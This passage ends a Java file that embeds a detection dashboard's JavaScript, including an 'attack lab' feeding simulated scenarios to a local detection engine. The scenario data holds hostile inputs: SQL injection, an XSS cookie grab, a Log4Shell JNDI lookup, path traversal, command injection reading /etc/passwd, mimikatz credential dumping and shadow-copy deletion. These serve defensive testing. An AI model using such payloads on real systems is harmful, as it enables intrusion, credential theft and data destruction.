    }).join('');
    $('#feed').innerHTML = '<table><thead><tr><th>Time</th><th>Source</th><th>Score</th><th>Rules that fired</th></tr></thead><tbody>' + (rows || '<tr><td colspan="4" class="mut">No detections in this range.</td></tr>') + '</tbody></table>';
  }
  $('#feed').addEventListener('click', function (e) {
    var tr = e.target.closest('tr.row'); if (!tr) return;
    var id = +tr.getAttribute('data-id'); openRow = openRow === id ? null : id; if (lastSummary) renderFeed(lastSummary);
  });
  function renderSources(d) {
    $('#sources').innerHTML = d.sources.map(function (s) {
      var cls = s.state === 'ACTIVE' ? 'on' : s.state === 'ERROR' ? 'err' : s.state === 'WAITING' ? 'wait' : '';
      return '<div class="srcrow"><span class="dot ' + cls + '"></span><span class="nm">' + esc(s.name) + '</span><span class="dt" title="' + esc(s.detail) + '">' + (s.state === 'ACTIVE' ? num(s.count) + ' events' : esc(s.detail)) + '</span></div>';
    }).join('');
  }
  var lastSummary = null;
  function poll() {
    if (document.hidden) return;
    var range = $('#range').value;
    Promise.all([get('/api/platform/summary?range=' + range), get('/api/platform/campaigns?range=60')]).then(function (res) {
      var d = res[0]; lastSummary = d;
      $('#offline').classList.remove('show');
      $('#statusDot').className = 'dot on'; $('#statusText').textContent = 'Engine online \\u00b7 ' + num(d.analyzed) + ' events';
      if (MODEL) { renderHero(d.recent); renderKpis(d); drawChart(d.series); renderTop(d); renderFeed(d); renderSources(d); renderCampaigns(res[1].campaigns); }
    }).catch(function () {
      $('#offline').classList.add('show'); $('#statusDot').className = 'dot off'; $('#statusText').textContent = 'Engine offline';
    });
  }
  $('#range').addEventListener('change', poll);
  window.addEventListener('resize', function () { if (lastSummary) drawChart(lastSummary.series); });

  /* ---------- self-test ---------- */
  var ST = null;
  function runSelfTest() {
    $('#stLine').textContent = 'Running verification\\u2026';
    get('/api/platform/selftest').then(function (d) {
      ST = d; var ok = d.failed === 0;
      $('#stBig').textContent = d.passed + '/' + d.total; $('#stBig').className = 'big ' + (ok ? 'ok' : 'bad');
      $('#stLine').textContent = ok ? 'All cases pass against the live rule code' : d.failed + ' case(s) failing';
      $('#stSub').textContent = d.cases.filter(function (c) { return c.kind === 'attack'; }).length + ' attacks that must fire, ' + d.cases.filter(function (c) { return c.kind === 'benign'; }).length + ' near-misses that must stay quiet, ' + d.cases.filter(function (c) { return c.kind === 'known-limit'; }).length + ' documented false positives.';
      $('#heroCases').textContent = d.total; $('#whyCases').textContent = d.total; $('#stNot').textContent = d.notCovered.join('; ');
      renderST();
    }).catch(function () { $('#stLine').textContent = 'Self-test unavailable (engine offline)'; });
  }
  var KIND = { attack: 'Attack', benign: 'Near-miss', 'known-limit': 'Known false positive' };
  function renderST() {
    if (!ST) return; var q = $('#stq').value.toLowerCase(), k = $('#stk').value;
    $('#stTable tbody').innerHTML = ST.cases.filter(function (c) { return (!k || c.kind === k) && (!q || (c.rule + ' ' + c.title + ' ' + c.input).toLowerCase().indexOf(q) >= 0); }).map(function (c) {
      var exp = c.expectFire ? (c.expectPoints >= 0 ? '+' + c.expectPoints : 'fires') : 'silent', act = c.actualPoints >= 0 ? '+' + c.actualPoints : 'silent';
      return '<tr><td><span class="res ' + (c.pass ? 'pass' : 'fail') + '">' + (c.pass ? 'PASS' : 'FAIL') + '</span></td><td><span class="rule-id">' + c.rule + '</span></td><td><span class="kind ' + c.kind + '">' + KIND[c.kind] + '</span></td><td>' + esc(c.title) + '</td><td class="mono tiny">' + esc(c.input) + '</td><td class="pts-cell">' + exp + ' &rarr; ' + act + '</td></tr>';
    }).join('');
  }
  $('#stRun').addEventListener('click', runSelfTest); $('#stq').addEventListener('input', renderST); $('#stk').addEventListener('change', renderST);

  /* ---------- attack lab ---------- */
  var WIN = 'C:\\\\Windows\\\\System32\\\\', OFFICE = 'C:\\\\Program Files\\\\Microsoft Office\\\\root\\\\Office16\\\\WINWORD.EXE';
  function w(path) { return { kind: 'web', path: path }; }
  var SCN = [
    { id: 'chain', star: true, name: 'Quiet intrusion, all five stages', desc: 'Scan, guess passwords, inject, run malware, steal credentials, hide tracks. Watch for the step where no single score is high but the campaign is.',
      steps: function () {
        var s = [];
        [22, 3389, 445, 3306, 6379].forEach(function (p) { s.push({ label: 'Probe port ' + p, kind: 'port', port: p }); });
        s.push({ label: 'GET /.env', kind: 'web', path: '/.env' }, { label: 'GET /.git/config', kind: 'web', path: '/.git/config' });
        for (var i = 1; i <= 8; i++) s.push({ label: 'Failed login for admin (' + i + ')', kind: 'auth_fail', user: 'admin', country: 'IN' });
        s.push({ label: "SQL injection: ' OR 1=1 --", kind: 'web', path: '/search', body: "id=1' OR 1=1 --" });
        s.push({ label: 'Download update.exe', kind: 'download', file: 'update.exe' });
        s.push({ label: 'Word starts cmd.exe', kind: 'process', path: WIN + 'cmd.exe', command: 'cmd.exe /c whoami /priv', parent: OFFICE });
        s.push({ label: 'mimikatz reads passwords', kind: 'process', path: 'C:\\\\Users\\\\Public\\\\mimikatz.exe', command: 'mimikatz sekurlsa::logonpasswords' });
        s.push({ label: 'New account svc_backup created', kind: 'win', event: 4720, path: 'svc_backup' });
        s.push({ label: 'Delete shadow copies', kind: 'process', path: WIN + 'vssadmin.exe', command: 'vssadmin delete shadows /all /quiet' });
        s.push({ label: 'Security log cleared', kind: 'win', event: 1102 });
        return s;
      } },
    { id: 'guess', name: 'Password guessing', desc: 'Twelve failed logins for admin. Points start at the 5th attempt and stop growing at 50.',
""";

    private static final String P3 = """
      steps: function () { var s = []; for (var i = 1; i <= 12; i++) s.push({ label: 'Failed login for admin (' + i + ')', kind: 'auth_fail', user: 'admin', country: 'IN' }); return s; } },
    { id: 'sqli', name: 'SQL injection', desc: 'A normal search, then three attack strings. One rule, +40: logged, not blocked.',
      steps: function () { return [{ label: 'Normal search', kind: 'web', path: '/search', body: 'q=blue running shoes' }, { label: "Body: id=1' OR 1=1 --", kind: 'web', path: '/search', body: "id=1' OR 1=1 --" }, { label: 'URL: UNION SELECT', kind: 'web', path: '/items?id=1 UNION SELECT user,pass FROM users' }, { label: 'XSS: script tag', kind: 'web', path: '/comment', body: '<scr' + 'ipt>document.cookie</scr' + 'ipt>' }]; } },
    { id: 'scanner', fixedIp: '185.220.101.1', name: 'Known-bad scanner', desc: 'A blacklisted address using sqlmap. Three rules stack to 105 and the address is blocked. A second request is rejected unanalysed.',
      steps: function () { return [{ label: 'sqlmap injection from a blacklisted address', kind: 'web', path: '/search', body: "id=1' OR 1=1 --", ua: 'sqlmap/1.7' }, { label: 'Follow-up request', kind: 'web', path: '/', ua: 'sqlmap/1.7' }]; } },
    { id: 'ports', name: 'Port sweep', desc: 'Eight ports in a row. The scan rule fires at the fifth distinct port.',
      steps: function () { return [21, 22, 23, 25, 53, 80, 443, 3306].map(function (p) { return { label: 'Probe port ' + p, kind: 'port', port: p }; }); } },
    { id: 'webkit', name: 'Web exploit attempts', desc: 'Log4Shell lookup, directory traversal, command injection and scanner paths in one visit.',
      steps: function () { return [{ label: 'Log4Shell JNDI lookup', kind: 'web', path: '/?x=${jndi:ldap://203.0.113.5/a}' }, { label: 'Traversal to /etc/passwd', kind: 'web', path: '/download?file=../../../../etc/passwd' }, { label: 'Double-encoded traversal', kind: 'web', path: '/a?f=%252e%252e%252fsecret' }, { label: 'Command injection', kind: 'web', path: '/ping?host=8.8.8.8;cat /etc/passwd' }, { label: 'GET /.env', kind: 'web', path: '/.env' }]; } },
    { id: 'travel', name: 'Impossible login', desc: 'The same address reports a login from India, then the US, seconds later.',
      steps: function () { return [{ label: 'Login success, country IN', kind: 'auth_ok', user: 'ravi', country: 'IN' }, { label: 'Login success, country US', kind: 'auth_ok', user: 'ravi', country: 'US' }]; } }
  ];
  var lab = { ip: '', running: false, stop: false, rows: [], sel: -1, maxScore: 0, blocked: false, camp: null, scn: null };
  function newIp() { lab.ip = '203.0.113.' + (100 + Math.floor(Math.random() * 150)); $('#labIp').textContent = lab.ip; }
  function renderScList() {
    $('#scList').innerHTML = SCN.map(function (s) {
      return '<button class="sc" data-id="' + s.id + '" aria-pressed="false"><b>' + s.name + (s.star ? ' <span class="star">start here</span>' : '') + '</b><span>' + s.desc + '</span></button>';
    }).join('');
  }
  function pickScenario(id) {
    lab.scn = SCN.filter(function (s) { return s.id === id; })[0];
    $$('#scList .sc').forEach(function (b) { b.setAttribute('aria-pressed', String(b.getAttribute('data-id') === id)); });
    $('#labRun').disabled = false;
  }
  $('#scList').addEventListener('click', function (e) { var b = e.target.closest('.sc'); if (b) pickScenario(b.getAttribute('data-id')); });
  $$('[data-scn]').forEach(function (b) { b.addEventListener('click', function () { pickScenario(b.getAttribute('data-scn')); document.getElementById('lab').scrollIntoView(); runLab(); }); });
  function resetLab() {
    lab.rows = []; lab.sel = -1; lab.maxScore = 0; lab.blocked = false; lab.camp = null;
    $('#labLog').innerHTML = ''; $('#labFinal').hidden = true;
    $('#labEvent').innerHTML = '<div class="empty">Waiting for the first step.</div>'; $('#labChain').innerHTML = '<div class="empty">The chain fills in as steps arrive.</div>';
  }
  function logHtml() {
    return '<table><tbody>' + lab.rows.map(function (r, i) {
      var ev = r.ev; var rl = ev.rules.filter(function (x) { return x.rule !== 'IP_ALREADY_BLOCKED'; });
      var chips = ev.rules.map(function (x) { return '<span class="chip ' + x.origin + '">' + x.rule + ' +' + x.score + '</span>'; }).join(' ');
      return '<tr data-i="' + i + '" class="' + (i === lab.sel ? 'sel' : '') + '"><td class="n">' + (i + 1) + '</td><td><div class="act-t">' + esc(r.step.label) + '</div>' + (chips ? '<div style="margin-top:3px">' + chips + '</div>' : '') + '</td><td class="sc-t">' + ev.score + ' <span class="lvl ' + ev.level + '">' + ev.level + '</span>' + (ev.blocked ? ' <span class="tag">blocked</span>' : '') + '</td></tr>';
    }).join('') + '</tbody></table>';
  }
  function showSel(i) {
    lab.sel = i; var r = lab.rows[i]; if (!r) return;
    $('#labEvent').innerHTML = eventPanel(r.ev);
    $$('#labLog tr').forEach(function (tr) { tr.className = (+tr.getAttribute('data-i') === i) ? 'sel' : ''; });
  }
  $('#labLog').addEventListener('click', function (e) { var tr = e.target.closest('tr'); if (tr) showSel(+tr.getAttribute('data-i')); });
  function chainPanel(c) {
    if (!c) { return '<div class="empty">No rule has fired for this actor yet.</div>'; }
    var nodes = STAGE_ORDER.map(function (id, i) {
      var on = c.stages.indexOf(id) >= 0;
      return '<div style="display:flex;gap:10px;align-items:center;margin-bottom:6px"><span class="stg"><i class="' + (on ? 'on' : '') + '" style="width:18px;height:18px"></i></span><span style="' + (on ? 'color:#fff;font-weight:600' : 'color:var(--conmut)') + '">' + (i + 1) + '. ' + esc(STAGE[id].name) + '</span></div>';
    }).join('');
    var cls = c.risk >= MODEL.campaign.blockAt ? 'block' : c.risk >= MODEL.campaign.escalateAt ? 'escalate' : '';
    return nodes + '<div style="margin-top:12px"><b class="mono" style="color:#fff;font-size:1.1rem">' + c.risk + '</b> <span class="act ' + c.action + '">' + c.action + (c.action === 'BLOCK' ? ' recommended' : '') + '</span> <span class="tiny mut">campaign risk</span></div><div class="dark" style="margin-top:6px">' + meterHtml(c.risk) + '</div>' +
      '<div class="tiny mut" style="margin-top:6px">Original engine: ' + (lab.blocked ? 'blocked this address' : 'has not blocked it') + ' \\u00b7 highest single event: ' + lab.maxScore + ' (' + levelOf(lab.maxScore) + ')</div>';
  }
  function finalHtml() {
    var c = lab.camp, n = lab.rows.length;
    var s = '<h4>Result</h4><div class="big">' + n + ' steps. Highest single-event score <b>' + lab.maxScore + ' (' + levelOf(lab.maxScore) + ')</b>. Original engine: <b>' + (lab.blocked ? 'blocked the address' : 'did not block') + '</b>.';
    if (c) s += ' Campaign view: <b>' + c.action + '</b>, risk <b>' + c.risk + '</b>, ' + c.stages.length + ' of 5 stages (' + esc(c.verdict.toLowerCase()) + ').';
    s += '</div>';
    if (c && c.engineMissed) s += '<p class="small mut" style="margin:8px 0 0">This is the gap the campaign view exists for: every step looked tolerable on its own, but together they are an intrusion.</p>';
    return s;
  }
  function runLab() {
    if (!lab.scn || lab.running || !MODEL) return;
    var sc = lab.scn; if (sc.fixedIp) { lab.ip = sc.fixedIp; $('#labIp').textContent = lab.ip; } else newIp();
    resetLab(); lab.running = true; lab.stop = false; $('#labRun').disabled = true; $('#labStop').disabled = false;
    var steps = sc.steps(), i = 0;
    (function next() {
      if (lab.stop || i >= steps.length) { done(); return; }
      var st = steps[i++], p = {}; Object.keys(st).forEach(function (k) { if (k !== 'label') p[k] = st[k]; }); p.ip = lab.ip;
      post('/api/platform/analyze', p).then(function (d) {
        lab.rows.push({ step: st, ev: d.event }); lab.maxScore = Math.max(lab.maxScore, d.event.score); lab.blocked = lab.blocked || d.event.blocked; lab.camp = d.campaign;
        var log = $('#labLog'); log.innerHTML = logHtml(); log.scrollTop = log.scrollHeight;
        showSel(lab.rows.length - 1); $('#labChain').innerHTML = chainPanel(d.campaign);
        setTimeout(next, sc.id === 'chain' ? 380 : 480);
      }).catch(function (e) { $('#labFinal').hidden = false; $('#labFinal').innerHTML = '<h4>Stopped</h4><div class="big">' + esc(e.message) + '</div>'; done(true); });
    })();
    function done(err) {
      lab.running = false; $('#labRun').disabled = false; $('#labStop').disabled = true;
      if (!err) { $('#labFinal').hidden = false; $('#labFinal').innerHTML = finalHtml(); }
      poll();
    }
  }
  $('#labRun').addEventListener('click', runLab);
  $('#labStop').addEventListener('click', function () { lab.stop = true; });
  $('#labNew').addEventListener('click', function () { newIp(); resetLab(); });
  $('#cSend').addEventListener('click', function () {
    if (lab.running) return; var k = $('#cKind').value, a = $('#cA').value, b = $('#cB').value, c = $('#cC').value, p = { kind: k, ip: lab.ip };
    if (k === 'web') { p.path = a; p.body = b; } else if (k === 'port') { p.port = c || a; } else if (k === 'download') { p.file = c || a; }
    else if (k === 'process') { p.path = a; p.command = b; } else if (k === 'win') { p.event = c || a; p.path = b; p.logon = 10; }
    else { p.user = a || 'guest'; p.country = c || 'IN'; }
    var step = { label: 'Custom: ' + k + ' ' + (a || c) };
    post('/api/platform/analyze', p).then(function (d) {
      lab.rows.push({ step: step, ev: d.event }); lab.maxScore = Math.max(lab.maxScore, d.event.score); lab.blocked = lab.blocked || d.event.blocked; lab.camp = d.campaign;
      $('#labLog').innerHTML = logHtml(); showSel(lab.rows.length - 1); $('#labChain').innerHTML = chainPanel(d.campaign); $('#labFinal').hidden = false; $('#labFinal').innerHTML = finalHtml(); poll();
    }).catch(function (e) { alert(e.message); });
  });

  /* ---------- boot ---------- */
  renderSteps(); renderScList(); newIp();
  loadModel().then(function () { poll(); pickScenario('chain'); }).catch(function () { $('#offline').classList.add('show'); });
  runSelfTest();
  setInterval(poll, 3000);
})();

</script>
</body>
</html>
""";

    public static final String PAGE = String.join("", P0, P1, P2, P3);
}
